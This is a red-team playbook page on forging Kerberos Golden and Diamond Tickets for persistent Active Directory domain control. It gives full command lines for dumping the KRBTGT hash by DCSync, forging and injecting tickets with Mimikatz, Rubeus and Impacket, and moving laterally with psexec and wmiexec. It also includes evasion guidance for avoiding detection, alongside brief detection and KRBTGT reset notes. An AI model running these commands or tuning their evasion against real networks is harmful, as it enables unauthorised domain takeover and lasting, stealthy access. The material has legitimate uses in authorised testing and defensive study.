# Golden Ticket & Diamond Ticket Persistence

> **MITRE ATT&CK**: Credential Access > T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
> **Platforms**: Windows Active Directory
> **Required Privileges**: KRBTGT hash (requires Domain Admin for extraction via DCSync)
> **OPSEC Risk**: Medium-High (anomalous Kerberos ticket properties detectable by advanced monitoring)

---

## Strategic Overview

The Golden Ticket is the most well-known Active Directory persistence mechanism. By forging a Kerberos Ticket-Granting Ticket (TGT) using the KRBTGT account's hash, an attacker can impersonate any user, including non-existent users, with any group memberships for the lifetime of the ticket. The persistence is extraordinarily durable: it remains valid until the KRBTGT password is changed twice (to invalidate both the current and previous password hashes). The Diamond Ticket represents an evolution of this technique, modifying a legitimately obtained TGT rather than forging one from scratch, making it significantly harder to detect. For a Red Team Lead, understanding both techniques and their detection profiles is critical for selecting the appropriate approach based on the target's defensive maturity, particularly their Kerberos monitoring capabilities.

## Technical Deep-Dive

### KRBTGT Hash Extraction

The KRBTGT hash is the prerequisite for both Golden and Diamond tickets.

```bash
# DCSync to extract KRBTGT hash (requires Replicating Directory Changes privilege)
# Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Output includes:
# Hash NTLM: <32-char hex hash>
# aes256_hmac: <64-char hex key>
# aes128_hmac: <32-char hex key>

# Rubeus - DCSync via SharpKatz
Rubeus.exe dump /service:krbtgt /nowrap

# Impacket (Linux)
secretsdump.py 'corp.local/admin:Password123@dc01.corp.local' -just-dc-user krbtgt
```

### Golden Ticket Creation - Mimikatz

```bash
# Gather required information
# Domain:     corp.local
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890
# KRBTGT NTLM: aabbccdd11223344aabbccdd11223344
# KRBTGT AES256: <64-char key> (preferred, more realistic)

# Create Golden Ticket (NTLM hash)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aabbccdd11223344aabbccdd11223344 /ptt

# Create Golden Ticket (AES256 key - stealthier, matches modern Kerberos)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /aes256:<aes256_key> /ptt

# Save to file instead of injecting
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aabbccdd11223344aabbccdd11223344 /ticket:golden.kirbi

# Custom parameters
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<hash> /id:500 /groups:512,519,520 /startoffset:-10 /endin:600 /renewmax:10080 /ptt
```

### Golden Ticket Creation - Rubeus

```bash
# Create and inject Golden Ticket
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt

# With specific group memberships
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /groups:512,519 /ptt

# Save to file
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /outfile:golden.kirbi
```

### Golden Ticket Creation - Impacket (Linux)

```bash
# Create Golden Ticket with ticketer.py
ticketer.py -nthash aabbccdd11223344aabbccdd11223344 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator

# Create with AES key
ticketer.py -aesKey <aes256_key> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Ticket Parameters and Significance

```
Parameter    | Default        | Significance
-------------|----------------|---------------------------------------------
/user        | Any name       | Can be real or fake user
/id          | 500            | User RID (500 = default Administrator)
/groups      | 513,512,520,   | Group RIDs to include in PAC
             | 518,519        | 512=DA, 519=EA, 518=Schema Admins
/startoffset | 0              | Minutes before now ticket becomes valid
/endin       | 600 (10 hrs)   | Ticket lifetime in minutes
/renewmax    | 10080 (7 days) | Maximum renewal lifetime
/sids        | (none)         | Extra SIDs (for cross-domain - SID history)
```

### Diamond Ticket (Stealthier Alternative)

Diamond Tickets modify a legitimately requested TGT rather than forging one from scratch.

```bash
# Rubeus Diamond Ticket
# Requests a real TGT, decrypts it with KRBTGT key, modifies PAC, re-encrypts
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:regularuser /password:Password123 /enctype:aes /domain:corp.local /dc:dc01.corp.local /ptt

# The resulting ticket:
# - Has legitimate encryption (matches real TGT structure)
# - Contains authentic ticket metadata (timestamps, sequence numbers)
# - Modified PAC grants elevated privileges
# - Much harder to detect than Golden Ticket
```

### Ticket Usage and Injection

```bash
# Inject saved ticket into current session
mimikatz # kerberos::ptt golden.kirbi

# Rubeus ticket injection
Rubeus.exe ptt /ticket:golden.kirbi

# Verify ticket is loaded
klist

# Use ticket for lateral movement
dir \\dc01.corp.local\C$
psexec.exe \\dc01.corp.local cmd.exe

# Use with Impacket
export KRB5CCNAME=golden.ccache
wmiexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
smbexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Persistence Duration and KRBTGT Reset

```
Golden Ticket remains valid until:
1. KRBTGT password is changed TWICE (current + previous hash invalidated)
2. The ticket's expiration/renewal time is exceeded (configurable by attacker)

KRBTGT Password Reset Process:
- First reset: Invalidates current hash, but old hash still works (AD keeps N-1)
- Second reset: Invalidates the previous hash
- Minimum 10-hour wait between resets recommended (replication)
- All existing Kerberos tickets in the domain become invalid after double reset

Detection of unreset KRBTGT:
- Check krbtgt password last set date
- Many organizations have never reset KRBTGT since domain creation
```

## Detection & Evasion

### Detection Mechanisms
- **Event ID 4769**: TGS request with suspicious TGT (non-existent user, abnormal lifetime)
- **PAC validation**: Microsoft PAC validation can detect forged PAC data
- **Ticket lifetime anomalies**: Golden Tickets often have 10-year lifetimes vs policy
- **Encryption type mismatches**: RC4 tickets in AES-only environments
- **Non-existent user detection**: TGT for user not in AD
- **Microsoft Defender for Identity**: Detects Golden Ticket usage patterns

### Evasion Techniques
- Use AES256 keys instead of NTLM hash (matches modern encryption expectations)
- Set realistic ticket lifetimes matching domain policy (default 10 hours)
- Use existing user accounts rather than fabricated names
- Set appropriate group memberships (do not add to every privileged group)
- Use Diamond Ticket instead of Golden Ticket for advanced environments
- Match the domain's Kerberos policy for ticket lifetime and renewal

### OPSEC Considerations
- Golden Tickets with default parameters are easily detected (10-year lifetime, RC4)
- The user specified does not need to exist, but non-existent users flag alerts
- Diamond Tickets are significantly harder to detect but require user credentials
- After using a Golden Ticket, all subsequent Kerberos service tickets are also forged
- Plan for KRBTGT reset as part of remediation -- this invalidates all domain tickets
- Store the KRBTGT hash securely; it provides indefinite domain persistence

## Cross-References

- `04-persistence/dcshadow-persistence.md` - DCShadow for persistent AD modifications
- `04-persistence/skeleton-key.md` - Skeleton Key as alternative AD persistence
- `07-credential-access/` - DCSync for KRBTGT hash extraction
- `12-active-directory-deep-dive/ad-persistence-deep-dive.md` - Comprehensive AD persistence guide

## References

- MITRE T1558.001: https://attack.mitre.org/techniques/T1558/001/
- Golden Ticket (Mimikatz): https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
- Rubeus: https://github.com/GhostPack/Rubeus
- Diamond Ticket research: https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/
- KRBTGT reset guidance: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-resetting-the-krbtgt-password
- Detecting Golden Tickets: https://adsecurity.org/?p=1515
